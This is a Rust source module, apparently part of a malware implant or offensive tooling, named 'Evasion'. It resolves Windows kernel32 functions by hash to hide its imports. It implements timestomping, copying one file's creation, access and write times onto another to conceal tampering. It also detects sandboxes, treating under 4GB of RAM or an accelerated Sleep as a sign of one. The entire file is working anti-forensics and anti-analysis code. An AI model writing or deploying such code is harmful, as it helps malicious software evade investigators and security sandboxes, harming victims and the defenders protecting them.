#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;
#[cfg(target_os = "windows")]
use core::ffi::c_void;

pub struct Evasion;

#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
struct MEMORYSTATUSEX {
    dwLength: u32,
    dwMemoryLoad: u32,
    ullTotalPhys: u64,
    ullAvailPhys: u64,
    ullTotalPageFile: u64,
    ullAvailPageFile: u64,
    ullTotalVirtual: u64,
    ullAvailVirtual: u64,
    ullAvailExtendedVirtual: u64,
}

#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
struct FILETIME {
    dwLowDateTime: u32,
    dwHighDateTime: u32,
}

impl Evasion {
    pub fn timestomp(&self, target: &str, source: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let create_file = resolve_function(kernel32, hash_str(b"CreateFileA"));
            let get_file_time = resolve_function(kernel32, hash_str(b"GetFileTime"));
            let set_file_time = resolve_function(kernel32, hash_str(b"SetFileTime"));
            let close_handle = resolve_function(kernel32, hash_str(b"CloseHandle"));

            if create_file.is_null() || get_file_time.is_null() || set_file_time.is_null() {
                return Err(());
            }

            type FnCreateFileA = unsafe extern "system" fn(
                *const u8,
                u32,
                u32,
                *mut c_void,
                u32,
                u32,
                HANDLE,
            ) -> HANDLE;
            type FnGetFileTime = unsafe extern "system" fn(
                HANDLE,
                *mut FILETIME,
                *mut FILETIME,
                *mut FILETIME,
            ) -> i32;
            type FnSetFileTime = unsafe extern "system" fn(
                HANDLE,
                *const FILETIME,
                *const FILETIME,
                *const FILETIME,
            ) -> i32;
            type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

            // Open Source
            let mut src_c = alloc::vec::Vec::from(source.as_bytes());
            src_c.push(0);
            let h_src = core::mem::transmute::<_, FnCreateFileA>(create_file)(
                src_c.as_ptr(),
                0x80000000, // GENERIC_READ
                1,          // FILE_SHARE_READ
                core::ptr::null_mut(),
                3,    // OPEN_EXISTING
                0x80, // FILE_ATTRIBUTE_NORMAL
                core::ptr::null_mut(),
            );

            if h_src == (-1 as isize as HANDLE) {
                return Err(());
            }

            let mut creation = FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            };
            let mut access = FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            };
            let mut write = FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            };

            core::mem::transmute::<_, FnGetFileTime>(get_file_time)(
                h_src,
                &mut creation,
                &mut access,
                &mut write,
            );
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_src);

            // Open Target
            let mut tgt_c = alloc::vec::Vec::from(target.as_bytes());
            tgt_c.push(0);
            let h_tgt = core::mem::transmute::<_, FnCreateFileA>(create_file)(
                tgt_c.as_ptr(),
                0x40000000 | 0x000100, // GENERIC_WRITE | FILE_WRITE_ATTRIBUTES (approx)
                0,
                core::ptr::null_mut(),
                3, // OPEN_EXISTING
                0x80,
                core::ptr::null_mut(),
            );

            if h_tgt == (-1 as isize as HANDLE) {
                return Err(());
            }

            let res = core::mem::transmute::<_, FnSetFileTime>(set_file_time)(
                h_tgt, &creation, &access, &write,
            );
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_tgt);

            if res == 0 {
                return Err(());
            }
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = target;
            let _ = source;
            Err(())
        }
    }

    pub fn is_sandbox(&self) -> bool {
        #[cfg(target_os = "windows")]
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let global_memory_status =
                resolve_function(kernel32, hash_str(b"GlobalMemoryStatusEx"));
            let get_tick_count = resolve_function(kernel32, hash_str(b"GetTickCount"));
            let sleep = resolve_function(kernel32, hash_str(b"Sleep"));

            if global_memory_status.is_null() || get_tick_count.is_null() || sleep.is_null() {
                return false; // Can't check
            }

            // 1. RAM Check
            type FnGlobalMemoryStatusEx = unsafe extern "system" fn(*mut MEMORYSTATUSEX) -> i32;
            let mut mem_status: MEMORYSTATUSEX = core::mem::zeroed();
            mem_status.dwLength = core::mem::size_of::<MEMORYSTATUSEX>() as u32;

            core::mem::transmute::<_, FnGlobalMemoryStatusEx>(global_memory_status)(
                &mut mem_status,
            );

            // If < 4GB RAM (4 * 1024 * 1024 * 1024), likely sandbox
            if mem_status.ullTotalPhys < 4 * 1024 * 1024 * 1024 {
                return true;
            }

            // 2. Time Acceleration Check
            type FnGetTickCount = unsafe extern "system" fn() -> u32;
            type FnSleep = unsafe extern "system" fn(u32);

            let t1 = core::mem::transmute::<_, FnGetTickCount>(get_tick_count)();
            core::mem::transmute::<_, FnSleep>(sleep)(1000);
            let t2 = core::mem::transmute::<_, FnGetTickCount>(get_tick_count)();

            // If diff < 1000, time was accelerated
            if (t2 - t1) < 1000 {
                return true;
            }

            false
        }
        #[cfg(not(target_os = "windows"))]
        {
            false
        }
    }
}
